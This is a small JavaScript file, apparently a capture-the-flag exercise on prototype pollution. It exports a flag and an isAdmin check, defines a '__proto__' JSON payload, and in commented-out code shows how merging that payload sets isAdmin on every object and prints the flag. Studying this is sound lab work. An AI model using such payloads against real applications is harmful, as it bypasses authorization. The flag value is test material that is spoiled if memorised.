exports.flag = 'flag{6d0ee098-9336-4945-a652-0570f4de1c86}';
exports.isAdmin = () => false;
exports.getUser = () => ({

});

var payload = '{"__proto__":{"isAdmin":"It works !"}}';


// var payload = '{"__proto__":{"isAdmin":"It works !"}}';
// var p = JSON.parse(payload)
// delete p.isAdmin
// var a = {};
// // a.isAdmin = sercet.isAdmin()
// console.log("Before : " + a.isAdmin);
// merge({}, p);
// console.log("After : " + a.isAdmin);
// if(a.isAdmin) {
//     console.log(sercet.flag)
// }
